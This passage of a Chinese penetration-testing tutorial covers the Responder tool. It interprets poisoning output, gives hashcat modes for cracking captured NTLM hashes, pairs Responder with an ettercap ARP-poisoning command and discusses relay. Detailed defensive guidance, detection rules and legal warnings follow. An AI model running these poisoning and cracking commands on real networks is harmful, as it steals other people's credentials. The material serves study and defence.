| `Challenge set` | 挑战值（可用于区分测试轮次） |
| `Responder NIC` / `Responder IP` | 接口与 IP |

### 关键事件行

| 输出 | 含义 | 严重性 |
| --- | --- | --- |
| `[LLMNR] Poisoned answer sent to X for name Y` | ✅ **投毒成功** | — |
| `[NBT-NS] Poisoned answer sent to X for name Y` | ✅ NBT-NS 投毒成功 | — |
| `[MDNS] Poisoned answer sent to X for name Y` | ✅ mDNS 投毒成功 | — |
| `[SMB] NTLMv2-SSP Client : X` | ⭐ 受害者 IP | 🟠 |
| `[SMB] NTLMv2-SSP Username : DOMAIN\user` | ⭐ 用户名与域 | 🟠 |
| **`[SMB] NTLMv2-SSP Hash : ...`** | ⭐⭐ **哈希——最终结果** | 🔴 |
| `[HTTP] NTLMv2-SSP Hash : ...` | 从 HTTP/WPAD 捕获的哈希 | 🔴 |
| `[SMB] NTLMv1-SSP Hash : ...` | ⚠️ **NTLMv1（弱得多）** | 🔴 |
| `[SMB] Cleartext Password : ...` | ⭐⭐⭐ **明文口令**（用 `-b` 或某些协议） | 🔴🔴 |
| `[DNS] Answer sent to X for name Y` | 伪造 DNS 应答 | 🟠 |

**⭐ `Cleartext Password` 是最严重的情况**——说明捕获的是明文而非哈希。这一般出现在：

- 用了 `-b`（Basic 认证）
- 或某些协议（如 FTP、POP3、部分 HTTP 表单）本身传明文

### 哈希文件

**位置**：`/usr/share/responder/logs/`

**命名规律**：

```
Responder-Session.log                     ← 总日志
SMB-NTLMv2-SSP-192.168.56.10.txt          ← 每台主机的哈希
HTTP-NTLMv2-SSP-192.168.56.10.txt
SMB-NTLMv1-SSP-192.168.56.10.txt
Analyzer-Session.log                      ← -A 模式的日志
```

**⭐ 按协议和源 IP 分文件**——便于按主机整理结果。

**清除测试痕迹**：

```bash
# ⚠️ 在授权测试中，先保存到安全位置，再清理
sudo rm /usr/share/responder/logs/*
```

### 判断成功

| 环节 | 成功标志 |
| --- | --- |
| 投毒 | `Poisoned answer sent to X for name Y` |
| 触发认证 | `NTLMv2-SSP Client : X` |
| **拿到哈希** | ⭐ **`NTLMv2-SSP Hash : ...`** |
| 拿到明文 | `Cleartext Password : ...` |
| 破解成功 | hashcat 输出 `<hash>:<明文>` |

**下一步**：

| 情况 | 动作 |
| --- | --- |
| 拿到 NetNTLMv2 | `hashcat -m 5600` 离线破解 |
| 拿到 NetNTLMv1 | `hashcat -m 5500`（**快得多**） |
| 拿到明文 | 直接可用（记录到报告） |
| 破解失败 | 用 [cewl](../04-口令攻击/cewl.md) 造定向字典；或考虑中继（需授权） |
| 想评估中继可行性 | `responder-RunFinger` 看哪些主机没有 SMB 签名 |

## 7. 与其他工具配合

```text
┌──── 触发层 ──────────────────────────────────────┐
│ 受害者（Windows）：打错域名 / 打开浏览器 / 访问旧服务器  │
└──────────────────┬───────────────────────────────┘
                   │ 广播查询（LLMNR / NBT-NS / mDNS）
                   ↓
┌──── 捕获层 ──────────────────────────────────────┐
│ ⭐ responder -I eth0 -w -v                        │
│   → 抢答名称解析                                   │
│   → 起一堆假服务器（SMB/HTTP/...）                  │
│   → 捕获 NTLM 认证                                 │
└──────────────────┬───────────────────────────────┘
                   │ NetNTLMv1 / v2 哈希
        ┌──────────┴──────────┐
        ↓                     ↓
┌── 离线破解 ──┐     ┌── 中继利用 ──────────┐
│ hashcat      │     │ responder-MultiRelay │
│ -m 5600/v1   │     │ 或 ntlmrelayx        │
│ (需要字典)    │     │ (需要目标无 SMB 签名) │
└──────────────┘     └──────────────────────┘

┌──── 辅助 ────────────────────────────────────────┐
│ responder-RunFinger   → 探测可中继的目标            │
│ responder-FindSQLSrv  → 发现 SQL Server            │
│ kismet (05 目录)      → 蓝队：检测异常             │
└──────────────────────────────────────────────────┘
```

| 组合 | 说明 |
| --- | --- |
| **responder → [hashcat](../04-口令攻击/hashcat.md)** | ⭐ **最核心的组合**。`-m 5600`（NTLMv2）/ `-m 5500`（NTLMv1） |
| **responder ↔ [ettercap](ettercap.md)** | ⭐ **互补**。ettercap 抓「正常通信的明文凭据（HTTP/FTP）」，responder 抓「名称解析失败触发的 NTLM」。**两者常同时运行** |
| **responder ↔ [bettercap](../05-无线攻击/bettercap.md)** | bettercap 的 `http.server` / 代理也能触发 NTLM 捕获；responder 更专注于名称解析投毒 |
| **responder → [Wireshark](wireshark.md)** | 用 `tshark`/Wireshark 从 pcap 里验证 NTLMSSP 报文 |
| **responder → [cewl](../04-口令攻击/cewl.md)** | 破不出哈希时，用 CeWL 造组织相关字典（**Windows 用户的口令常与公司相关**） |
| **[macchanger](macchanger.md)** | 改 MAC 减少被追踪（注意：**这不是为了规避检测**，而是减少对环境的污染） |
| **[kismet](../05-无线攻击/kismet.md)** | 蓝队：从无线侧观察异常多播流量 |
| **`arpwatch`** | 蓝队：检测 ARP 表变化（Responder 不做 ARP 投毒，但其他工具会） |

**⭐ Ettercap + Responder 的组合值得展开**：

```bash
# 终端 1：Ettercap 做 ARP 投毒（流量经过你）
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.56.10/ /192.168.56.1/

# 终端 2：Responder 捕获名称解析投毒带来的 NTLM
sudo responder -I eth0 -w -v
```

**它们解决不同的问题**：

| | Ettercap | Responder |
| --- | --- | --- |
| 触发方式 | 目标**主动通信** | 目标**名称解析失败** |
| 覆盖的流量 | 「目标 ↔ 网关/服务器」 | 「目标的广播查询」 |
| 抓到的 | 明文协议凭据 | **NTLM 认证** |
| 需要 ARP 投毒 | ✅ 是 | ❌ 否（Responder 靠多播） |

**⭐ Responder 的一个「优势」是它不需要 ARP 投毒**——它只靠**多播/广播**就够了。这意味着它**更隐蔽**（不改变目标的 ARP 表，难以检测）。

## 8. 常见坑与排错

### 8.1 权限与接口

| 报错/现象 | 原因 | 解决 |
| --- | --- | --- |
| `You must be root` | 需要特权（要绑定 < 1024 的端口） | `sudo` |
| `Error: No such device` | 接口名错 | `ip addr` 确认；或 `-I eth0` |
| `responder: command not found` | 未安装 | `sudo apt install responder` |
| 端口已被占用 | 别的服务在用 445/80/443/53 | 停掉冲突服务；检查 `ss -tlnup \| grep -E ':(445\|80\|443\|53)'` |
| Responder 起不来 | 已有实例在跑 | `pkill -f Responder` |

### 8.2 抓不到哈希

**这是最常见的问题。** 排查顺序：

| 排查点 | 检查方法 | 解决 |
| --- | --- | --- |
| **1. 投毒是否生效** | 输出里有没有 `Poisoned answer sent` | 没有 → 检查是否误用了 `-A`；检查接口 |
| **2. 目标是否产生了查询** | 在 `-A` 模式下观察 | 目标没有查询 → 手动触发（`\\nonexistent`）；或等 |
| **3. DNS 是否先解析了** | 目标能不能 ping 通那个名字 | 如果 DNS 里有记录 → **不会走 LLMNR** → 换一个不存在的名字 |
| **4. 目标的 LLMNR 是否开启** | 见下方检查命令 | 关闭了 → 无法投毒（**这是防御措施生效了**） |
| **5. 目标是否要求 SMB 签名** | `responder-RunFinger` | **签名不影响捕获**（只影响中继） |
| **6. 是不是同一网段** | `ip addr` vs 目标 IP | 多播不跨网段 → 必须在同一广播域 |
| **7. 防火墙** | 目标是否放行入站 | 本地防火墙可能挡住 445 |

**检查目标是否开启 LLMNR（Windows）**：

```powershell
# 查看 LLMNR 策略
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' `
  -Name EnableMulticast -ErrorAction SilentlyContinue
# EnableMulticast = 0 表示已禁用（防御生效）
```

**⭐ 如果目标的 LLMNR 和 NBT-NS 都被禁用了，Responder 就完全无效**——这正是防御措施。

### 8.3 影响面失控

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| **抓到了不该抓的设备的哈希** | 你的网段里有别人的设备 | ⭐ **立即停止**，删除哈希文件，报告给授权方 |
| 网络变慢 | Responder 起了很多假服务器 | 减少启用的服务 |
| 用户抱怨弹窗 | 用了 `-F` / `-P` / `-b` | 去掉这些参数（静默捕获） |
| DHCP 相关参数扰乱了网络 | 用了 `-d` / `-D` / `--dhcpv6` | ⚠️ **立即停止**；这些会影响所有设备 |

**⭐ 最重要的一条**：

> **在开始之前，先确认你的网段里没有别人的设备。**
>
> 如果 `ip neigh` 里出现了不认识的 MAC/IP —— **停下来**。
>
> Responder 的攻击面是**整个广播域**，你无法「只针对某一台设备」（除了用 `-A` 模式）。

**这是 Responder 与 [ettercap](ettercap.md) 的一个重要区别**：

| | Ettercap | Responder |
| --- | --- | --- |
| 能否限定单个目标 | ✅ **可以**（TARGET 语法） | ❌ **不能**（多播无法定向） |
| 影响面 | 可控 | ⚠️ **整个广播域** |

**⭐ 所以 Responder 对环境的隔离要求更高。**

### 8.4 破解相关

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 哈希存了但破不出 | 口令不在字典里 | 换字典（[rockyou](../04-口令攻击/wordlists.md) / [cewl](../04-口令攻击/cewl.md) / [crunch](../04-口令攻击/crunch.md)）；上 GPU |
| 破解极慢 | NetNTLMv2 比破裸哈希慢 | 正常；用 GPU（[hashcat](../04-口令攻击/hashcat.md)） |
| 用了 `-m 1000` 破不出 | **模式错了** | NetNTLMv2 是 `-m 5600`，不是 `-m 1000`（那是 NTLM 哈希） |
| 哈希里有 `$HEX[]` | 用户名含特殊字符 | hashcat 会自动处理 |
| 文件名带 `(1)` 等后缀 | 重复捕获 | 正常；用 `cat **/*.txt` 一起喂给 hashcat |

**⭐ 一个常见错误**：

```
❌ 错误：把 NetNTLMv2 当 NTLM 哈希，用 -m 1000
✅ 正确：NetNTLMv2 → -m 5600，NTLMv1 → -m 5500
```

**用 `hashcat --identify` 确认类型**。

### 8.5 日志与痕迹管理

| 事项 | 说明 |
| --- | --- |
| 哈希日志位置 | `/usr/share/responder/logs/` |
| 应该做什么 | ⭐ **在授权测试中，把日志移到加密位置，然后清理本机** |
| 不应该做什么 | 把哈希文件留在默认位置（别的测试可能混进来，也可能泄露） |
| 报告中的处理 | **不应包含完整哈希**（除非 ROE 明确要求） |

```bash
# 测试结束的标准流程
# 1) 保存到加密位置（示例）
mkdir -p /secure/engagement-x && chmod 700 /secure/engagement-x
cp -r /usr/share/responder/logs/* /secure/engagement-x/
tar -czf /secure/engagement-x.tar.gz /secure/engagement-x

# 2) 清理本机默认位置
sudo rm -rf /usr/share/responder/logs/*
```

**⭐ 这是「合规的渗透测试」与「随便玩玩」的一个重要区别**：**你知道数据在哪，并且控制它。**

## 9. 防御视角（蓝队）

**Responder 之所以有效，是因为 Windows 的默认配置「太方便了」。** 防御的核心就是**关掉这些便利**。

### 9.1 攻击链与对策的对应

```
攻击链：
  用户打错域名
      ↓
  ① Windows 广播 LLMNR/NBT-NS/mDNS 查询      ← 对策 A：禁用这些协议
      ↓
  ② Responder 抢答「我是」                    ← 对策 A 生效后此步不存在
      ↓
  ③ Windows 自动发送 NTLM 认证                ← 对策 B：禁用 NTLM，强制 Kerberos
      ↓
  ④ Responder 捕获哈希                        ← 对策 B 生效后此步不存在
      ↓
  ⑤ 离线破解 (hashcat -m 5600)                ← 对策 C：长口令 + 慢哈希 + 唯一密码
      ↓
  或 ⑥ 中继到其他服务器                        ← 对策 D：启用 SMB 签名 + LDAP 签名
```

**⭐ 四条对策，对应攻击链的四个环节。理想情况下四条都做。**

### 9.2 对策 A：禁用 LLMNR / NBT-NS / mDNS

**这是最直接、最有效的对策**——它让 Responder **完全没有攻击面**。

**① 通过组策略禁用 LLMNR**（推荐，可批量下发）

```
计算机配置 → 管理模板 → 网络 → DNS 客户端
  → 「关闭多播名称解析」 → 已启用

对应的注册表项：
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient
  EnableMulticast = 0 (DWORD)
```

**② 通过 PowerShell 批量检查**：

```powershell
# 检查所有域内机器的 LLMNR 状态
Invoke-Command -ComputerName (Get-ADComputer -Filter * | Select -Expand Name) -ScriptBlock {
    $v = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' `
        -Name EnableMulticast -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Computer     = $env:COMPUTERNAME
        LLMNREnabled = if ($v.EnableMulticast -eq 0) { 'No' } else { 'YES ⚠️' }
    }
}
```

**③ 禁用 NBT-NS**

NBT-NS 的关闭需要**按网卡设置**（没有直接的组策略）：

```
网络适配器 → 属性 → Internet 协议版本 4 (TCP/IPv4) → 高级 → WINS 选项卡
  → 选择「禁用 TCP/IP 上的 NetBIOS」

对应的注册表（每个接口一个子项）：
HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\Tcpip_{GUID}
  NetbiosOptions = 2 (DWORD)   # 2 = 禁用
```

**PowerShell 批量设置**：

```powershell
# 对每台机器的每个接口禁用 NetBIOS over TCP/IP
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces' |
  ForEach-Object {
    Set-ItemProperty -Path $_.PSPath -Name NetbiosOptions -Value 2
  }
```

**④ 禁用 mDNS**

```
计算机配置 → 管理模板 → 网络 → DNS 客户端
  → 「关闭多播名称解析」（同一个策略覆盖）
```

**⑤ 关键：同时确保 DNS 是完整的**

**⚠️ 一个重要的现实**：

> 禁用 LLMNR/NBT-NS 会**暴露**组织里所有「依赖名称解析容错」的地方。
> 有些内部应用可能依赖 LLMNR 解析短名。
>
> **正确做法**：先在**小范围**试点，观察是否有业务受影响，做好 DNS 记录的补全，再全网推行。

**⑥ 补全 DNS 记录（治本）**

**如果 `wpad` 被频繁查询，说明有设备在做 WPAD 发现**：

| 方案 | 说明 |
| --- | --- |
| **在 DNS 里加 wpad 记录**（指向真实代理或无） | 让查询成功解析，**不会走到 LLMNR** |
| **禁用浏览器自动发现代理** | 组策略：`用户配置 → 策略 → Windows 设置 → Internet Explorer 维护 → 连接 → 自动浏览器配置` |
| **禁用 WPAD 服务** | 组策略：`WinHttpAutoProxySvc` 设为禁用 |

**⭐ 这是一个「看起来反直觉但很有效」的措施**：

> **在 DNS 里添加一个 wpad 记录（即使指向一个不存在的地址），就能消除 WPAD 攻击。**
>
> 因为查询会「成功解析」，就不会走 LLMNR，Responder 也就没有机会抢答。

### 9.3 对策 B：禁用 NTLM，强制 Kerberos

**如果 NTLM 被禁用，Responder 即使投毒成功也拿不到可利用的凭据。**

| 措施 | 说明 |
| --- | --- |
| **域级别限制 NTLM** | 组策略：`计算机配置 → 安全设置 → 本地策略 → 安全选项 → 网络安全: 限制 NTLM` |
| **审计模式先行** | 先开「审核」看哪些应用依赖 NTLM，再逐步收紧 |
| **禁用 NTLMv1** | `网络安全: LAN Manager 身份验证级别` → 「仅发送 NTLMv2 响应。拒绝 LM 和 NTLM」 |
| **禁用 LM 哈希** | `网络安全: 不要在下次更改密码时存储 LAN Manager 的哈希值` |

**推荐的注册表设置（域控）**：

```
HKLM\SYSTEM\CurrentControlSet\Control\Lsa
  LmCompatibilityLevel = 5    # 仅发送 NTLMv2 响应，拒绝 LM & NTLM
```

**⭐ 注意 LmCompatibilityLevel 的取值**：

| 值 | 含义 |
| --- | --- |
| 0 | 发送 LM & NTLM 响应 |
| 1 | 发送 LM & NTLM，协商使用 NTLMv2（有则用） |
| 2 | 仅发送 NTLM 响应 |
| 3 | 仅发送 NTLMv2 响应 |
| 4 | 仅发送 NTLMv2 响应，拒绝 LM |
| **5** | **仅发送 NTLMv2 响应，拒绝 LM 和 NTLM** ⭐ |

**⚠️ 现实**：完全禁用 NTLM 在多数环境中**很难**（很多老应用依赖它）。**务实的做法是**：

```
1. 先禁用 NTLMv1（这个通常没有业务影响）
2. 再通过审核找出 NTLM 的使用者
3. 逐步迁移到 Kerberos
4. 目标是从「限制」到「拒绝」
```

### 9.4 对策 C：让哈希破不出来

**如果哈希被捕获了（比如攻击者绕过了 A 和 B），还有第三道防线。**

| 措施 | 效果 |
| --- | --- |
| **口令长度 ≥ 14（管理员 ≥ 16）** | 超出口令字典与规则的覆盖范围 |
| **禁止口令复用** | 一个口令泄露不影响其他系统 |
| **定期检查已泄露口令** | 用泄露库比对（HIBP k-Anonymity 或本地库） |
| **避免「可猜的规律」** | 这需要配合 [cewl](../04-口令攻击/cewl.md) 的防御思路（不泄露内部词汇） |
| **服务账户用长随机密码（gMSA）** | ⭐ **服务账户是最常见的高价值目标** |
| **定期更换服务账户口令** | 降低长期泄露的影响 |

**⭐ 为什么服务账户特别重要**：

> 服务账户（用于服务间认证）通常：
> - **口令很长但很少轮换**；
> - **权限很高**（往往在大量服务器上有权限）；
> - **会在很多地方自动发起 NTLM 认证** —— ⭐ **这正好是 Responder 的理想目标**。
>
> **对策**：使用 **gMSA（组管理服务账户）**——它用自动轮换的 240 字符密码，**几乎不可能被破解**，也是 NTLM 中继的天然屏障。

### 9.5 对策 D：启用 SMB 签名与 LDAP 签名

**这是抵御 NTLM 中继的关键**——如果 A、B、C 都被绕过了，这一步能阻止「不破解就直接登录」。

**① 启用 SMB 签名（域级别，推荐）**

```
计算机配置 → Windows 设置 → 安全设置 → 本地策略 → 安全选项
  → 「Microsoft 网络服务器: 数字签名通信(始终)」 → 已启用
  → 「Microsoft 网络客户端: 数字签名通信(如果服务器同意)」 → 已启用
```

**PowerShell 批量审计**：

```powershell
Invoke-Command -ComputerName (Get-ADComputer -Filter * | Select -Expand Name) -ScriptBlock {
    $srv = Get-SmbServerConfiguration
    [PSCustomObject]@{
        Computer     = $env:COMPUTERNAME
        RequireSigning = $srv.RequireSecuritySignature
    }
} | Format-Table
```

**② 启用 LDAP 签名**

```
域控制器策略 → 计算机配置 → 策略 → Windows 设置 → 安全设置 → 本地策略 → 安全选项
  → 「网络安全: LDAP 客户端签名要求」 → 「要求签名」
  → 「域控制器: LDAP 服务器签名要求」 → 「要求签名」
```

**③ 启用 SMB 加密（更强，但有性能代价）**

```
「Microsoft 网络服务器: 加密数据和签名(始终)」 → 已启用
```

**⭐ 审计脚本（评估你的中继风险）**：

```bash
# 用 responder-RunFinger 审计（这是本文最有实用价值的蓝队用法）
responder-RunFinger -i 10.0.0.0/24 2>/dev/null | \
  grep -E 'IP:|Hostname:|SMB Signing:'
```

**输出里每一个 `SMB Signing: Disabled` 都是一个中继风险点。**

### 9.6 检测（当预防失效时）

**Responder 的行为在网络上是可检测的**：

| 行为 | 检测信号 |
| --- | --- |
| **投毒应答** | 同一 IP 对**多个不存在的名称**快速给出 LLMNR/NBT-NS 应答 |
| **异常响应者** | 大量 LLMNR/NBT-NS 应答来自**非 DNS/非 WINS 服务器**的 IP |
| **假服务器** | 出现非授权的 SMB/HTTP/WPAD 服务（尤其是 3141 端口的 WPAD） |
| **多播应答频率** | 正常网络几乎不应有多播应答（因为查询通常都失败） |
| **NTLM 认证到异常目标** | 大量 NTLM 认证发往一台**不是文件服务器**的机器 |
| **WPAD 查询** | 出现大量 `wpad` 名称查询（说明有设备在做 WPAD 发现） |

**检测规则思路**：

```text
# 规则 1：异常的多播应答
if count(llmnr_responses, src_ip=X, 60s) > 10
   and X not in {authorized_dns_servers, authorized_wins_servers}
then alert "possible LLMNR/NBT-NS poisoning (Responder)"

# 规则 2：一台机器响应大量不同名称
if count(distinct names in llmnr_responses, src_ip=X, 300s) > 20
then alert "possible name resolution poisoning"

# 规则 3：NTLM 认证流向非授权服务器
if count(ntlmssp_auth, dst_ip=X, 300s) > 5
   and X not in {file_servers, application_servers}
then alert "possible NTLM relay target or Responder"

# 规则 4：WPAD 查询异常
if count(dns/llmnr queries, name == "wpad", 300s) > 5
then alert "WPAD discovery activity (check for proxy config issues)"
```

**工具**：

- **Zeek（原 Bro）**：有 LLMNR/NBT-NS 的解析器，可以写检测脚本；
- **Suricata/Snort**：可以写规则匹配多播应答；
- **Windows 事件日志**：监控异常的 NTLM 认证（4624 类型 3 的登录）；
- **[kismet](../05-无线攻击/kismet.md)**：从无线侧观察。

**⭐ 一个特别有效的检测**：

```bash
# 用 tcpdump 找出所有 LLMNR 应答（不是查询）
sudo tcpdump -i eth0 -nn 'udp port 5355' -A | grep -i 'response\|answer'
```

**正常网络里，LLMNR 应答应该非常少**（因为查询通常都失败，没人应答）。**突然出现大量应答 = 有人在投毒。**

**NBT-NS（UDP 137）同理**：

```bash
# 找出所有 NBT-NS 应答
sudo tcpdump -i eth0 -nn 'udp port 137' -A | grep -i 'response'
```

### 9.7 一个必须做的检查清单

```text
[ ] 域内所有机器的 LLMNR 是否已禁用？（组策略 EnableMulticast=0）
[ ] 所有网卡的 NetBIOS over TCP/IP 是否已禁用？（NetbiosOptions=2）
[ ] mDNS 是否已禁用？
[ ] DNS 里是否有 wpad 记录（或已禁用浏览器自动发现代理）？
[ ] LmCompatibilityLevel 是否 ≥ 4（拒绝 LM）？
[ ] 是否在向 NTLM 过渡（至少禁用 NTLMv1）？
[ ] 所有服务器的 SMB 签名是否已启用？
[ ] LDAP 签名是否已启用？
[ ] 服务账户是否用 gMSA（而非固定长口令）？
[ ] 是否有监控能发现异常的多播应答？
```

**⭐ 这份清单可以直接作为「Responder 防御合规检查表」使用。**

### 9.8 一个重要的认识

**Responder 之所以可怕，是因为它利用的是「用户会打错字」和「默认配置太方便」这两件几乎无法改变的事。**

| 现实 | 含义 |
| --- | --- |
| **用户总会打错域名** | 触发条件永远存在 |
| **默认配置为便利而设计** | 需要主动去关才能安全 |
| **攻击不需要任何前置条件** | 攻击者只要「在同一网段」就够了 |
| **一次投毒影响整个广播域** | 没有「局部」的选项 |

**因此防御必须靠配置，而不能靠用户培训**：

> 「员工不要打错域名」是不可能实现的；
> 「在 DNS 里补全记录 + 禁用 LLMNR + 启用 SMB 签名」是可以实现的。
>
> **安全要靠让错误不产生后果，而不是靠人不犯错。**

## 10. 参考

- 官方仓库与文档：<https://github.com/lgandx/Responder>
- 官方 README（含各参数说明）：<https://github.com/lgandx/Responder/blob/master/README.md>
- Kali 工具页：<https://www.kali.org/tools/responder/>
- 本机帮助：`responder -h`（**版本间差异大，以本机为准**）
- 配置文件：`/etc/responder/Responder.conf`
- 日志目录：`/usr/share/responder/logs/`
- 配套工具帮助：`responder-MultiRelay -h`、`responder-RunFinger -h`、`responder-Icmp-Redirect -h`、`responder-FindSQLSrv -h`
- Microsoft 文档：
  - [LLMNR 概述](https://learn.microsoft.com/en-us/previous-versions/technet-magazine/ff384970(v=msdn.10))
  - [禁用 LLMNR 的组策略](https://learn.microsoft.com/en-us/windows-server/networking/dns/troubleshoot/)
  - [NTLM 限制](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm)
- 相关本目录：[ettercap](ettercap.md)、[wireshark](wireshark.md)、[tcpdump](tcpdump.md)、[mitmproxy](mitmproxy.md)、[macchanger](macchanger.md)
- 相关其他目录：[hashcat](../04-口令攻击/hashcat.md)（`-m 5500`/`-m 5600`）、[cewl](../04-口令攻击/cewl.md)、[wordlists](../04-口令攻击/wordlists.md)、[bettercap](../05-无线攻击/bettercap.md)

## ⚠️ 法律与伦理

**Responder 的法律风险在于：它捕获的是「他人设备的认证凭据」。**

**为什么风险高**：

| 行为 | 法律性质 |
| --- | --- |
| **投毒名称解析** | 主动欺骗他人设备 |
| **伪装成服务器** | 冒充服务 |
| **捕获 NTLM 凭据** | ⭐ **窃取他人凭据** |
| **离线破解口令** | 试图获取他人账户的访问权 |
| **NTLM 中继** | ⭐⭐ **实际的未授权访问**（比捕获哈希严重得多） |

**特别警告**：

> **Responder 没有「只针对单个目标」的选项。**
>
> 它的攻击面是**整个广播域**——你只要运行，就会对**同网段的所有设备**进行投毒。
>
> 这意味着：**如果你在学校/公司/家庭网络上运行它，你会在不知情的情况下攻击了同学/同事/家人的设备。**
>
> **「我不知道网段里有别人」不是抗辩理由。**

**相关法律责任**（中国大陆）：

| 法律 | 条款 | 行为 |
| --- | --- | --- |
| 《刑法》 | 第二百八十五条 | **非法侵入计算机信息系统罪** / **非法获取计算机信息系统数据罪** |
| 《刑法》 | 第二百八十六条 | 破坏计算机信息系统罪 |
| 《刑法》 | 第二百五十三条之一 | **侵犯公民个人信息罪** |
| 《刑法》 | 第二百六十六条 | 诈骗罪（若用 WPAD 做钓鱼） |
| 《网络安全法》 | 第二十七条 | 禁止任何危害网络安全的活动 |
| 《个人信息保护法》 | 相关条款 | 截获凭据涉及个人信息 |
| 《数据安全法》 | 相关条款 | 数据处理活动的合规要求 |

**本教程仅适用于**：

- ✅ **你自己搭建的完全隔离的实验网络**（host-only 虚拟网络，**只有你的 Kali + 你自己的 Windows 虚拟机**）
- ✅ 有**书面授权**、明确列出授权网段、允许的攻击类型、以及**对用户可见干扰的范围**（`-F`/`-P` 会弹窗）的渗透测试
- ✅ 授权的 CTF 靶场

**严禁**：

- ❌ 在学校、公司、咖啡馆、机场等任何有他人设备的网络上运行 Responder
- ❌ 在自己的家庭网络（有家人设备）上运行
- ❌ 用 `-d` / `-D` / `--dhcpv6`（影响所有请求 DHCP 的设备）
- ❌ 保留、分析、分享他人的 NTLM 哈希
- ❌ 对非授权目标做 NTLM 中继
- ❌ 把捕获的哈希用于任何非授权目的

**使用前的强制检查清单**：

```text
[ ] -I 指定的网卡连的是完全隔离的实验网络？
[ ] 我用 ip neigh 确认过网段里只有我自己的设备？
[ ] 我已经先在 -A 模式（分析模式）观察过请求量？
[ ] 我没有使用 -d / -D / --dhcpv6（DHCP 相关，影响面最大）？
[ ] 我的授权书明确覆盖了「名称解析投毒」和「凭据捕获」？
[ ] 如果用了 -F / -P / -b（会弹窗），授权书里说明了允许对用户可见的干扰？
[ ] 我知道测试结束后要清理 /usr/share/responder/logs/？
```

**任何一项打不上勾，就不要运行。**

**最安全的学法（强烈推荐）**：

```text
⭐ 场景 1：分析模式（-A）
   sudo responder -I eth0 -A
   → 完全不投毒，不发送任何伪造应答
   → 能学到：LLMNR/NBT-NS/mDNS 的工作方式、组织里有多少解析失败的查询
   → 覆盖了 50% 的知识点，零法律风险

✅ 场景 5：离线分析哈希
   hashcat -m 5600 hashes.txt wordlist.txt
   → 完全离线，不接触任何网络

✅ 隔离实验：host-only 虚拟网络 + 你自己的 Windows 虚拟机
   → 覆盖 100% 的知识点，完全隔离

✅ 用 responder-RunFinger 审计自己组织的 SMB 签名覆盖率
   → 这是纯防御价值的工作，对组织有实际帮助
```

**最后一句**：**Responder 的防御措施（禁用 LLMNR/NBT-NS、启用 SMB 签名、限制 NTLM）都是明确的、可落地的配置项。** 学它的价值在于**推动这些配置落地**——这比「会用这个工具」有价值得多。
